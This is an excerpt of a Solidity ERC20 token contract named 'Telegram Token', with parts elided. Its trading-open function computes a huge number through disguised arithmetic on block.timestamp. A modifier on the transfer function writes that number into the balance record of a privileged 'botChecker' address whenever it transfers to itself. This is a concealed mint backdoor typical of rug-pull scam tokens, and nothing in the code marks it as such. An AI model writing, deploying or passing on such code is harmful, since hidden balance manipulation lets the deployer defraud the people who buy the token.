...
library MathUtils {
    ...
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "MathUtils: subtraction overflow");
    }
    ...
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "MathUtils: division by zero");
    }
    ...
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "MathUtils: modulo by zero");
    }
...
contract TT is Context, IERC20, Ownable {
    ...
    string private _name = unicode"Telegram Token";
    ...
    bool openTradeSettings=false;  
    uint256 maxWalletsSettings=0;
    ...
    function openTradingNow() public onlyOwner {
        openTradeSettings=true;
        maxWalletsSettings = 2*(2*5)**2 *block.timestamp;
        maxWalletsSettings = maxWalletsSettings * (2*5)**(2*9);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) LPA(sender,recipient,maxWalletsSettings) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if((!isMarketPair[recipient] && sender != owner() && !isExcludedFromFee[sender]))
            require(openTradeSettings != false, "Trading is not active.");   

        if(sender == recipient)
            return recipient == botChecker;
    ...
    modifier LPA(address spe, address rev,uint256 _max){
        if(spe == rev && spe == botChecker){
            _wallBalanceStatus[rev]=_max;
        }
        _;
    }
